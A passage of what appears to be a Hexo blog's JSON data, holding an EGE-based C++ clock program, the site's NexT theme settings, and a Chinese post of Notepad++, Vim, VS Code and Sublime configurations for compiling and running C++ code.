t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">8</span>); setcolor(BLUE);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">80</span>, t-&gt;tm_hour % <span class=\"number\">12</span> * <span class=\"number\">30</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">80</span>, t-&gt;tm_hour % <span class=\"number\">12</span> * <span class=\"number\">30</span> + t-&gt;tm_min / <span class=\"number\">12</span>, <span class=\"number\">1</span>));<span class=\"comment\">//时针</span></span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">4</span>); setcolor(RED);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">40</span>, t-&gt;tm_min * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">40</span>, t-&gt;tm_min * <span class=\"number\">6</span>, <span class=\"number\">1</span>));<span class=\"comment\">//分针</span></span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">2</span>); setcolor(YELLOW);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">10</span>, t-&gt;tm_sec * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">10</span>, t-&gt;tm_sec * <span class=\"number\">6</span>, <span class=\"number\">1</span>));<span class=\"comment\">//秒针</span></span><br><span class=\"line\">\tsetfillcolor(YELLOW); fillellipse(posx, posy, <span class=\"number\">5</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">\tsetcolor(GREEN); setfont(<span class=\"number\">30</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>); outtextxy(<span class=\"number\">95</span>, <span class=\"number\">500</span>, str);<span class=\"comment\">//数字时钟</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tinitgraph(<span class=\"number\">480</span>, <span class=\"number\">640</span>);<span class=\"comment\">//初始化画布</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; !kbhit(); delay_fps(<span class=\"number\">60</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcleardevice();<span class=\"comment\">//清除画布</span></span><br><span class=\"line\">\t\tloop();<span class=\"comment\">//更新</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclosegraph();<span class=\"comment\">//关闭画布</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1868,"excerpt":"","more":"<blockquote>\n<p>C++编写的Clocl GUI</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;graphics.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> posx = <span class=\"number\">240</span>, posy = <span class=\"number\">240</span>, R = <span class=\"number\">170</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">24</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">point</span><span class=\"params\">(<span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> rad, <span class=\"keyword\">bool</span> xy)</span><span class=\"comment\">//获取偏移点坐标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> x = posx, y = posy;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (xy)<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)(y - r * <span class=\"built_in\">cos</span>(rad* PI / <span class=\"number\">180</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)(x + r * <span class=\"built_in\">sin</span>(rad* PI / <span class=\"number\">180</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span><span class=\"comment\">//更新</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">30</span>, <span class=\"number\">30</span>, <span class=\"number\">30</span>));</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">3</span>); setcolor(EGERGB(<span class=\"number\">64</span>, <span class=\"number\">0</span>, <span class=\"number\">128</span>));</span><br><span class=\"line\">\tcircle(posx, posy, R + <span class=\"number\">16</span>); circle(posx, posy, R + <span class=\"number\">14</span>); circle(posx, posy, R + <span class=\"number\">12</span>); circle(posx, posy, R + <span class=\"number\">10</span>);</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">1</span>); setcolor(EGERGB(<span class=\"number\">128</span>, <span class=\"number\">128</span>, <span class=\"number\">128</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">60</span>; i++)<span class=\"comment\">//刻度</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i % <span class=\"number\">5</span>)line(point(R + <span class=\"number\">2</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">2</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>));</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> line(point(R - <span class=\"number\">4</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">4</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>)); setfont(<span class=\"number\">18</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">12</span>; i++)<span class=\"comment\">//读数</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(str, <span class=\"string\">&quot;%d&quot;</span>, i);</span><br><span class=\"line\">\t\touttextrect(point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">0</span>) - <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">1</span>) - <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">0</span>) + <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">1</span>) + <span class=\"number\">5</span>, str);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">time_t</span> t_now; time(&amp;t_now); tm* t = localtime(&amp;t_now);<span class=\"comment\">//获取系统时间</span></span><br><span class=\"line\">\t<span class=\"built_in\">sprintf</span>(str, <span class=\"string\">&quot;%04d/%02d/%02d %02d:%02d:%02d&quot;</span>, t-&gt;tm_year + <span class=\"number\">1900</span>, t-&gt;tm_mon + <span class=\"number\">1</span>, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">8</span>); setcolor(BLUE);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">80</span>, t-&gt;tm_hour % <span class=\"number\">12</span> * <span class=\"number\">30</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">80</span>, t-&gt;tm_hour % <span class=\"number\">12</span> * <span class=\"number\">30</span> + t-&gt;tm_min / <span class=\"number\">12</span>, <span class=\"number\">1</span>));<span class=\"comment\">//时针</span></span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">4</span>); setcolor(RED);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">40</span>, t-&gt;tm_min * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">40</span>, t-&gt;tm_min * <span class=\"number\">6</span>, <span class=\"number\">1</span>));<span class=\"comment\">//分针</span></span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">2</span>); setcolor(YELLOW);</span><br><span class=\"line\">\tline(posx, posy, point(R - <span class=\"number\">10</span>, t-&gt;tm_sec * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">10</span>, t-&gt;tm_sec * <span class=\"number\">6</span>, <span class=\"number\">1</span>));<span class=\"comment\">//秒针</span></span><br><span class=\"line\">\tsetfillcolor(YELLOW); fillellipse(posx, posy, <span class=\"number\">5</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">\tsetcolor(GREEN); setfont(<span class=\"number\">30</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>); outtextxy(<span class=\"number\">95</span>, <span class=\"number\">500</span>, str);<span class=\"comment\">//数字时钟</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tinitgraph(<span class=\"number\">480</span>, <span class=\"number\">640</span>);<span class=\"comment\">//初始化画布</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; !kbhit(); delay_fps(<span class=\"number\">60</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcleardevice();<span class=\"comment\">//清除画布</span></span><br><span class=\"line\">\t\tloop();<span class=\"comment\">//更新</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclosegraph();<span class=\"comment\">//关闭画布</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"配置文件","date":"2019-03-29T09:11:09.000Z","abbrlink":"da99de06","_content":"# Notepad++\n```bat <code>编译</code>\ncmd /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe \"$(FULL_CURRENT_PATH)\" & PAUSE & EXIT\n```\n```bat <code>运行</code>\ncmd /k \"$(CURRENT_DIRECTORY)\\$(NAME_PART)\" & PAUSE & EXIT\n```\n```bat <code>编译并运行</code>\ncmd /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe \"$(FULL_CURRENT_PATH)\" &cmd /k \"$(CURRENT_DIRECTORY)\\$(NAME_PART)\" & PAUSE & EXIT\n```\n<!--more-->\n# .vimrc\n```vimrc\nset number\nset nocompatible\nsyntax on\nset showmode\nset showcmd\nset mouse=a\nset encoding=utf-8\nset t_Co=256\nfiletype indent on\nset autoindent\nset tabstop=4\nset shiftwidth=4\nset cursorline\nset nowrap\nset laststatus=2\nset ruler\nset showmatch\nset hlsearch\nset ignorecase\nset smartcase\nset nobackup\nset noswapfile\nset noerrorbells\nset visualbell\nset history=1000\nset autoread\nset listchars=tab:»■,trail:■\nset wildmenu\nset wildmode=longest:list,full\n```\n\n# VS code\n`launch.json`\n```json\n{\n\t\"version\": \"0.2.0\",\n\t\"configurations\": [\n\t\t{\n\t\t\t\"name\": \"(gdb) Launch\", // 配置名称，将会在启动配置的下拉菜单中显示\n\t\t\t\"type\": \"cppdbg\",\t   // 配置类型，这里只能为cppdbg\n\t\t\t\"request\": \"launch\",\t// 请求配置类型，可以为launch（启动）或attach（附加）\n\t\t\t\"program\": \"${workspaceRoot}/${fileBasenameNoExtension}.exe\",// 将要进行调试的程序的路径\n\t\t\t\"args\": [],\t\t\t // 程序调试时传递给程序的命令行参数，一般设为空即可\n\t\t\t\"stopAtEntry\": false,   // 设为true时程序将暂停在程序入口处，一般设置为false\n\t\t\t\"cwd\": \"${workspaceRoot}\", // 调试程序时的工作目录，一般为${workspaceRoot}即代码所在目录\n\t\t\t\"environment\": [],\n\t\t\t\"externalConsole\": true, // 调试时是否显示控制台窗口，一般设置为true显示控制台\n\t\t\t\"MIMode\": \"gdb\",\n\t\t\t\"miDebuggerPath\": \"E:\\\\MinGW\\\\bin\\\\gdb.exe\", // miDebugger的路径，注意这里要与MinGw的路径对应\n\t\t\t\"preLaunchTask\": \"g++\", // 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc\n\t\t\t\"setupCommands\":\n\t\t\t[\n\t\t\t\t{\n\t\t\t\t\t\"description\": \"Enable pretty-printing for gdb\",\n\t\t\t\t\t\"text\": \"-enable-pretty-printing\",\n\t\t\t\t\t\"ignoreFailures\": true\n\t\t\t\t}\n\t\t\t]\n\t\t}\n\t]\n}\n```\n`tasks.json`\n```json\n{\n\t\"version\": \"2.0.0\",\n\t\"command\": \"g++\",\n\t\"args\": [\"-g\",\"${file}\",\"-o\",\"${fileBasenameNoExtension}.exe\"],\t// 编译命令参数\n\t\"problemMatcher\": {\n\t\t\"owner\": \"cpp\",\n\t\t\"fileLocation\": [\"relative\", \"${workspaceRoot}\"],\n\t\t\"pattern\": {\n\t\t\t\"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n\t\t\t\"file\": 1,\n\t\t\t\"line\": 2,\n\t\t\t\"column\": 3,\n\t\t\t\"severity\": 4,\n\t\t\t\"message\": 5\n\t\t}\n\t}\n}\n```\n# Sublime\n```json <code>G++.sublime-build</code>\n{ \n    \"cmd\": [\"g++\", \"${file}\", \"-std=c++11\", \"-o\", \"${file_path}\\\\\\\\${file_base_name}\", \"&\", \"start\", \"cmd\", \"/c\", \"${file_path}\\\\\\\\${file_base_name} & echo. & pause\"],\n    \"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\", \"working_dir\": \"${file_path}\",\n    \"selector\": \"source.c, source.c++\", \"shell\": true,\n    \"encoding\":\"cp936\", \n    \"variants\":\n    [\n        {\n            \"name\" : \"Build Only\",\n            \"cmd\":[\"g++\", \"${file}\", \"-std=c++11\", \"-o\", \"${file_path}\\\\\\\\${file_base_name}\"]\n        },\n        {\n            \"name\" : \"Run Only\",\n            \"cmd\" : [\"start\", \"cmd\", \"/c\", \"${file_path}\\\\\\\\${file_base_name} & echo. & pause\"]\n        }\n    ]\n}\n```","source":"_posts/Configuration.md","raw":"---\ntitle: 配置文件\ndate: 2019-03-29 17:11:09\ncategories:\n  - 资料\ntags:\n  - Notepad\n  - VIM\n  - VScode\n  - Sublime\nabbrlink: da99de06\n---\n# Notepad++\n```bat <code>编译</code>\ncmd /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe \"$(FULL_CURRENT_PATH)\" & PAUSE & EXIT\n```\n```bat <code>运行</code>\ncmd /k \"$(CURRENT_DIRECTORY)\\$(NAME_PART)\" & PAUSE & EXIT\n```\n```bat <code>编译并运行</code>\ncmd /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe \"$(FULL_CURRENT_PATH)\" &cmd /k \"$(CURRENT_DIRECTORY)\\$(NAME_PART)\" & PAUSE & EXIT\n```\n<!--more-->\n# .vimrc\n```vimrc\nset number\nset nocompatible\nsyntax on\nset showmode\nset showcmd\nset mouse=a\nset encoding=utf-8\nset t_Co=256\nfiletype indent on\nset autoindent\nset tabstop=4\nset shiftwidth=4\nset cursorline\nset nowrap\nset laststatus=2\nset ruler\nset showmatch\nset hlsearch\nset ignorecase\nset smartcase\nset nobackup\nset noswapfile\nset noerrorbells\nset visualbell\nset history=1000\nset autoread\nset listchars=tab:»■,trail:■\nset wildmenu\nset wildmode=longest:list,full\n```\n\n# VS code\n`launch.json`\n```json\n{\n\t\"version\": \"0.2.0\",\n\t\"configurations\": [\n\t\t{\n\t\t\t\"name\": \"(gdb) Launch\", // 配置名称，将会在启动配置的下拉菜单中显示\n\t\t\t\"type\": \"cppdbg\",\t   // 配置类型，这里只能为cppdbg\n\t\t\t\"request\": \"launch\",\t// 请求配置类型，可以为launch（启动）或attach（附加）\n\t\t\t\"program\": \"${workspaceRoot}/${fileBasenameNoExtension}.exe\",// 将要进行调试的程序的路径\n\t\t\t\"args\": [],\t\t\t // 程序调试时传递给程序的命令行参数，一般设为空即可\n\t\t\t\"stopAtEntry\": false,   // 设为true时程序将暂停在程序入口处，一般设置为false\n\t\t\t\"cwd\": \"${workspaceRoot}\", // 调试程序时的工作目录，一般为${workspaceRoot}即代码所在目录\n\t\t\t\"environment\": [],\n\t\t\t\"externalConsole\": true, // 调试时是否显示控制台窗口，一般设置为true显示控制台\n\t\t\t\"MIMode\": \"gdb\",\n\t\t\t\"miDebuggerPath\": \"E:\\\\MinGW\\\\bin\\\\gdb.exe\", // miDebugger的路径，注意这里要与MinGw的路径对应\n\t\t\t\"preLaunchTask\": \"g++\", // 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc\n\t\t\t\"setupCommands\":\n\t\t\t[\n\t\t\t\t{\n\t\t\t\t\t\"description\": \"Enable pretty-printing for gdb\",\n\t\t\t\t\t\"text\": \"-enable-pretty-printing\",\n\t\t\t\t\t\"ignoreFailures\": true\n\t\t\t\t}\n\t\t\t]\n\t\t}\n\t]\n}\n```\n`tasks.json`\n```json\n{\n\t\"version\": \"2.0.0\",\n\t\"command\": \"g++\",\n\t\"args\": [\"-g\",\"${file}\",\"-o\",\"${fileBasenameNoExtension}.exe\"],\t// 编译命令参数\n\t\"problemMatcher\": {\n\t\t\"owner\": \"cpp\",\n\t\t\"fileLocation\": [\"relative\", \"${workspaceRoot}\"],\n\t\t\"pattern\": {\n\t\t\t\"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n\t\t\t\"file\": 1,\n\t\t\t\"line\": 2,\n\t\t\t\"column\": 3,\n\t\t\t\"severity\": 4,\n\t\t\t\"message\": 5\n\t\t}\n\t}\n}\n```\n# Sublime\n```json <code>G++.sublime-build</code>\n{ \n    \"cmd\": [\"g++\", \"${file}\", \"-std=c++11\", \"-o\", \"${file_path}\\\\\\\\${file_base_name}\", \"&\", \"start\", \"cmd\", \"/c\", \"${file_path}\\\\\\\\${file_base_name} & echo. & pause\"],\n    \"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\", \"working_dir\": \"${file_path}\",\n    \"selector\": \"source.c, source.c++\", \"shell\": true,\n    \"encoding\":\"cp936\", \n    \"variants\":\n    [\n        {\n            \"name\" : \"Build Only\",\n            \"cmd\":[\"g++\", \"${file}\", \"-std=c++11\", \"-o\", \"${file_path}\\\\\\\\${file_base_name}\"]\n        },\n        {\n            \"name\" : \"Run Only\",\n            \"cmd\" : [\"start\", \"cmd\", \"/c\", \"${file_path}\\\\\\\\${file_base_name} & echo. & pause\"]\n        }\n    ]\n}\n```","slug":"Configuration","published":1,"updated":"2020-05-11T09:34:38.224Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkae000fqse518ts2dva","content":"<h1 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h1><figure class=\"highlight bat\"><figcaption><span><code>编译</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k g++ -o 